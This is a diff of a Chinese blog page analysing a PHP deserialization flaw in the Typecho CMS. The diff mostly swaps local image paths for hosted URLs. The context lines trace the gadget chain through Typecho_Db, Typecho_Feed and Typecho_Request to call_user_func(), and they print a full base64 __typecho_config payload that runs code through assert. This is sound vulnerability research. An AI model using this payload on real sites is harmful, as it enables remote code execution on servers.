@@ -16,7 +16,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://www.hvnt3r.top/gallery/thumbnails/wallhaven-nme2xy.jpg">
 <meta property="article:published_time" content="2021-02-09T09:17:49.000Z">
-<meta property="article:modified_time" content="2021-02-09T09:31:23.671Z">
+<meta property="article:modified_time" content="2021-02-09T12:52:33.298Z">
 <meta property="article:author" content="Hvnt3r">
 <meta property="article:tag" content="PHP反序列化">
 <meta property="article:tag" content="漏洞挖掘">
@@ -166,7 +166,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    19 分钟 读完 (大约 2876 个字)
+                    19 分钟 读完 (大约 2776 个字)
                 </span>
                 
                 
@@ -222,15 +222,15 @@
 <p>1、GET请求的finish非空</p>
 <p>2、__typecho_config字段中存放payload</p>
 <p>跟进Typecho_Db类发现此类中存在一个构造函数，此构造函数中存在一个将成员与字符串进行拼接的操作，由上文中提到的魔法函数可知，此步骤可能触发<code>__toString()</code>魔法函数，因此从源码中寻找可用的包含<code>__toString()</code>的类。</p>
-<p><img src="/Users/hvnt3r/Blog/%E6%9C%AC%E5%9C%B0%E4%BB%93%E5%BA%93/img/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0%E3%80%81%E9%98%B2%E5%BE%A1%E3%80%81%E7%BB%95%E8%BF%87/FcJilg6ba81TuAh.png" alt="Typecho_Db中的__construct()"></p>
+<p><img src="https://i.loli.net/2021/02/09/FcJilg6ba81TuAh.png" alt="Typecho_Db中的__construct()">)</p>
 <p>在Typecho_Feed中找到了可用的<code>__toString()</code>魔法函数</p>
-<p><img src="/Users/hvnt3r/Blog/%E6%9C%AC%E5%9C%B0%E4%BB%93%E5%BA%93/img/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0%E3%80%81%E9%98%B2%E5%BE%A1%E3%80%81%E7%BB%95%E8%BF%87/hJIcTR7dmSEy2N6.png" alt="__toString()"></p>
+<p><img src="https://i.loli.net/2021/02/09/hJIcTR7dmSEy2N6.png" alt="__toString()"></p>
 <p>在这个魔法函数中找到了属性调用的代码，当目标类中不存在screenName属性时可以触发<code>__get()</code>魔法函数，下一步在源码中寻找可用的<code>__get()</code>魔法函数</p>
-<p><img src="/Users/hvnt3r/Blog/%E6%9C%AC%E5%9C%B0%E4%BB%93%E5%BA%93/img/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0%E3%80%81%E9%98%B2%E5%BE%A1%E3%80%81%E7%BB%95%E8%BF%87/bvI5XzCSgfGQV4P.png" alt="__get()"></p>
+<p><img src="https://i.loli.net/2021/02/09/bvI5XzCSgfGQV4P.png" alt="__get()"></p>
 <p>在Typecho_Request中找到了<code>__get()</code>魔法函数：</p>
-<p><img src="/Users/hvnt3r/Blog/%E6%9C%AC%E5%9C%B0%E4%BB%93%E5%BA%93/img/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0%E3%80%81%E9%98%B2%E5%BE%A1%E3%80%81%E7%BB%95%E8%BF%87/bdpsjBveqYmk7F8.png" alt="__get()魔法函数"></p>
+<p><img src="https://i.loli.net/2021/02/09/bdpsjBveqYmk7F8.png" alt="__get()魔法函数"></p>
 <p><code>__get()</code>魔法函数中调用<code>_applyFilter</code>中又可以用于命令执行的函数<code>call_user_func()</code>：</p>
-<p><img src="/Users/hvnt3r/Blog/%E6%9C%AC%E5%9C%B0%E4%BB%93%E5%BA%93/img/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0%E3%80%81%E9%98%B2%E5%BE%A1%E3%80%81%E7%BB%95%E8%BF%87/uCQgS976qHm4b8L.png" alt="目标函数"></p>
+<p><img src="https://i.loli.net/2021/02/09/uCQgS976qHm4b8L.png" alt="目标函数"></p>
 <p>到这里一条完整的构造链就梳理出来了，完整payload如下：</p>
 <figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__typecho_config&#x3D;YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo1OntzOjU6InRpdGxlIjtzOjE6IjEiO3M6NDoibGluayI7czoxOiIxIjtzOjQ6ImRhdGUiO2k6MTUxMTc5NTIwMTtzOjg6ImNhdGVnb3J5IjthOjE6e2k6MDtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fXM6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6ODoidHlwZWNob18iO30&#x3D;</span><br></pre></td></tr></table></figure>
 
